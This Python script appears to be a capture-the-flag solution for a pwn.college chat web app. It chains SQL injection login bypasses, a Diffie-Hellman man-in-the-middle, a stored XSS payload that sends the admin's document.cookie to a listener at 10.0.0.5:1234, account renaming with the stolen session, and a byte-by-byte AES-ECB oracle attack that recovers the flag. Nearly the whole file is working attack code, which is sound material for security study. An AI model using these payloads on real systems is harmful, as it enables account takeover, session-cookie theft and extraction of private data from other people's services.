#!/usr/bin/python3
import os
import requests
import re
from Crypto.Util.Padding import pad,unpad
from Crypto.Cipher import AES
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs


def get_sharon_username():
    url = "http://10.0.0.1"
    p = int.from_bytes(bytes.fromhex(
    "FFFFFFFF FFFFFFFF C90FDAA2 2168C234 C4C6628B 80DC1CD1 "
    "29024E08 8A67CC74 020BBEA6 3B139B22 514A0879 8E3404DD "
    "EF9519B3 CD3A431B 302B0A6D F25F1437 4FE1356D 6D51C245 "
    "E485B576 625E7EC6 F44C42E9 A637ED6B 0BFF5CB6 F406B7ED "
    "EE386BFB 5A899FA5 AE9F2411 7C4B1FE6 49286651 ECE45B3D "
    "C2007CB8 A163BF05 98DA4836 1C55D39A 69163FA8 FD24CF5F "
    "83655D23 DCA3AD96 1C62F356 208552BB 9ED52907 7096966D "
    "670C354E 4ABC9804 F1746C08 CA18217C 32905E46 2E36CE3B "
    "E39E772C 180E8603 9B2783A2 EC07A28F B5C55DF0 6F4C52C9 "
    "DE2BCBF6 95581718 3995497C EA956AE5 15D22618 98FA0510 "
    "15728E5A 8AACAA68 FFFFFFFF FFFFFFFF"
    ), "big")
    g = 2

    a = int.from_bytes(os.urandom(256),"big")
    A = pow(g,a,p)


    def post_key():
        session = requests.Session()
        data ={
            "username":"ball' union select 'alice','r',0 --'",
            "password":"hello"
        }
        session.post(url+"/login",data = data)
        r = session.post(url+"/chat/bob",data={"message":f"Hey Bob, I need to chat with you about something important. Let's chat securely over DHE-AES: {A}."})
    post_key()

    def capture_key():
        session = requests.Session()
        data = {"username":"ball' union select 'alice','a',0 --","password":"pas"}
        session.post(url+"/login",data=data)
        B_re = re.compile(r"^bob: Hey Alice, sure: (\d+)\.$", re.MULTILINE)
        while True:
            response = session.get("http://10.0.0.1/chat/bob")
            if match := B_re.search(response.text):
                break
            time.sleep(1)
        B = int(match.group(1))
        return B

    r = requests.Session()
    r.post(url+"/login",data={"username":"mallory' --","password":"hello"})
    r.post(url+"/chat/alice",data={"message":"I heard someone shared the flag with Bob!"})

    B = capture_key()
    s = pow(B,a,p)
    key = s.to_bytes(256,"big")[:16]
    cipher = AES.new(key,AES.MODE_ECB)
    encrypt = lambda data: cipher.encrypt(pad(data.encode(),cipher.block_size)).hex()
    decrypt = lambda data: unpad(cipher.decrypt(bytes.fromhex(data)),cipher.block_size).decode()


    def post_final():
        session = requests.Session()
        data ={
           "username":"ball' union select 'alice','r',0 --'",
           "password":"hello"
        }
        session.post(url+"/login",data = data)
        data = encrypt("Hey Bob, I know that someone shared the flag with you. Who was it?")
        r = session.post(url+"/chat/bob",data={"message":data})
    post_final()

    time.sleep(3)

    def username():
        session = requests.Session()
        data ={
            "username":"ball' union select 'alice','r',0 --'",
            "password":"hello"
        }
        session.post(url+"/login",data = data)
        encrypted_message_re = re.compile(r"^bob: ([0-9a-f]+)$", re.MULTILINE)
        while True:
            response = session.get(f"{url}/chat/bob")
            encrypted_messages = encrypted_message_re.findall(response.text)
            for em in encrypted_messages:
                if "shar" in decrypt(em):
                    text = decrypt(em)
                    break
            time.sleep(1)
            if "sharon" in  text:
                break

        user = re.findall(r"[a-zA-Z0-9.\s,]*sharon[0-9]{1,20}[a-zA-Z0-9.\s,]*",text)[0]
        return user

    user = username()
    return user

def get_admin_cookie():
    url = "http://10.0.0.1"
    data = {"username":"mallory'--","password":"pass"}
    session = requests.Session()
    session.post(url+"/login",data=data)
    session.post(url+"/chat/alice",data = {"message":"<script>fetch('http://10.0.0.5:1234/?c='+document.cookie)</script>"})
    class Handler(BaseHTTPRequestHandler):
        result = None
        def do_GET(self):
            parsed = urlparse(self.path)
            params = parse_qs(parsed.query)
            ip,_ =self.client_address

            c = params.get("c", [None])[0]
            if ip == "10.0.0.1":
                Handler.result = {"c": c}

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")


    server = HTTPServer(("0.0.0.0", 1234), Handler)
    server.handle_request()
    result = Handler.result
    server.server_close()
    
    return result["c"].replace("session=","")
    
cookie = get_admin_cookie()
user = get_sharon_username()
#s = requests.Session()
#s.cookies.set("session",cookie,domain="10.0.0.1")

def get_hash():
    url = "http://10.0.0.1"
    data = {"username":"ball' union select encrypted_contents,'y',0 from encrypted_chats where encrypted_username_1 is NULL or encrypted_username_2 is NULL--",
             "password":"pass"}
    r = requests.post(url+"/login",data=data).text
    hash = re.findall(r"Hello\s[a-f0-9]+!",r)[0].replace("Hello ","")[:-1]
    return hash[:192]

def modify(username,new_username):
    session = requests.Session()
    session.cookies.set("session",cookie,domain="10.0.0.1")
    url = "http://10.0.0.1/user/"+username+"/modify"
    session.post(url,data = {"username":new_username,"password":"pass"})

modify("bob",user)

username1 = "a"*70+": The flag is pwn.college{"
username2 = "a"*70
modify(user,username2)
priv_username2 = username2
for i in range(len(username2)):
    modifying_username = username2[1:]
    modify(priv_username2,modifying_username) 
    hash = get_hash()
    modifying_username2 = modifying_username
    for k in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_=-.!}":
        username1 = username1[1:] + k
        modify(modifying_username2,username1)
        hash1 = get_hash()
        if hash1 == hash:
            print(username1)
            priv_username2 = username1
            break
        modifying_username2 = username1
        username1 = "a" + username1[:-1]
    
    username2 = username2[1:]
